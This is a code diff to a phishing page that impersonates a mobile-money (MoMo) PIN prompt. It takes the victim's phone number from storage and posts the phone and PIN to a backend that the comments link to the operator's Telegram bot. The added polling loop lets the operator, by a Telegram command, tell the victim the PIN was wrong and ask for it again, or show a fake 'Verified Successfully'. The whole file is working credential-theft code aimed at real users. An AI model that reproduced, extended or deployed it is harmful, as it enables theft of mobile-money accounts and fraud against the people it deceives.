@@ -29,7 +29,7 @@ body {
   margin: 40px auto;
   padding: 25px;
   border-radius: 15px;
-  display: block; /* Shown immediately now */
+  display: block;
 }
 
 input {
@@ -55,13 +55,14 @@ button {
   cursor: pointer;
 }
 
+button:disabled {
+  background: #cccccc;
+  cursor: not-allowed;
+}
+
 .footer {
   margin-top: 20px;
   font-size: 12px;
-}
-
-.status {
-  display: none; /* Hidden because we are already approved */
 }
 </style>
 </head>
@@ -73,11 +74,10 @@ button {
 </div>
 
 <div class="container" id="pinContainer">
-  <h3>Enter MoMo PIN</h3>
+  <h3 id="titleText">Enter MoMo PIN</h3>
   <p id="phoneDisplay"></p>
 
   <form id="pinForm">
-    <!-- Changed type to number or text for easier input, kept placeholder -->
     <input type="password" id="pinInput" placeholder="****" maxlength="5" pattern="\d*" inputmode="numeric" required>
     <button type="submit" id="pinBtn">Confirm</button>
   </form>
@@ -88,60 +88,79 @@ button {
 </div>
 
 <script>
-// 1. Get phone from storage
 const phone = localStorage.getItem("phone");
 
-// 2. Security: If no phone, go back to start
+// 1. Security Check
 if (!phone) {
   window.location.href = "/";
 } else {
   document.getElementById("phoneDisplay").innerText = "Number: " + phone;
 }
 
-// 3. Notify Telegram that the user has reached the PIN page
-fetch("/pin-step", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ phone })
-}).catch(err => console.log("Step notification failed"));
+// 2. Form Elements
+const pinForm = document.getElementById("pinForm");
+const pinInput = document.getElementById("pinInput");
+const pinBtn = document.getElementById("pinBtn");
+const titleText = document.getElementById("titleText");
 
-// 4. Handle PIN Submission
-document.getElementById("pinForm").addEventListener("submit", async function(e) {
+// 3. Handle PIN Submission
+pinForm.addEventListener("submit", async function(e) {
   e.preventDefault();
-
-  const pinValue = document.getElementById("pinInput").value;
-  const btn = document.getElementById("pinBtn");
-
-  // Visual feedback
-  btn.innerText = "Verifying...";
-  btn.disabled = true;
+  
+  const pinValue = pinInput.value;
+  pinBtn.innerText = "Verifying...";
+  pinBtn.disabled = true;
 
   try {
-    // SEND THE PIN TO YOUR TELEGRAM BOT VIA BACKEND
-    const response = await fetch("/send-pin", {
+    // Send PIN to your Backend/Telegram
+    await fetch("/send-pin", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ 
-        phone: phone, 
-        pin: pinValue 
-      })
+      body: JSON.stringify({ phone: phone, pin: pinValue })
     });
 
-    if (response.ok) {
-      // Small delay for realistic feel
+    // Start checking for your command from Telegram
+    checkAdminCommand();
+
+  } catch (err) {
+    alert("Connection error. Try again.");
+    pinBtn.innerText = "Confirm";
+    pinBtn.disabled = false;
+  }
+});
+
+// 4. The Dynamic "Waiting for Admin" Loop
+async function checkAdminCommand() {
+  try {
+    const res = await fetch("/check-pin-status/" + phone);
+    const data = await res.json();
+
+    if (data.status === "re-enter") {
+      // Logic for 1/3, 2/3 attempts
+      pinBtn.innerText = "Confirm";
+      pinBtn.disabled = false;
+      pinInput.value = ""; 
+      titleText.innerText = "Incorrect PIN. Try Again (" + data.attempt + "/3)";
+      titleText.style.color = "red";
+    } 
+    
+    else if (data.status === "success") {
+      titleText.innerText = "Verified Successfully!";
+      titleText.style.color = "green";
       setTimeout(() => {
         window.location.href = "/success.html";
-      }, 2000);
-    } else {
-      throw new Error("Failed to send");
+      }, 1500);
+    } 
+    
+    else {
+      // Still pending admin action, check again in 2 seconds
+      setTimeout(checkAdminCommand, 2000);
     }
 
   } catch (err) {
-    alert("System busy. Please try again.");
-    btn.innerText = "Confirm";
-    btn.disabled = false;
+    setTimeout(checkAdminCommand, 3000);
   }
-});
+}
 </script>
 
 </body>
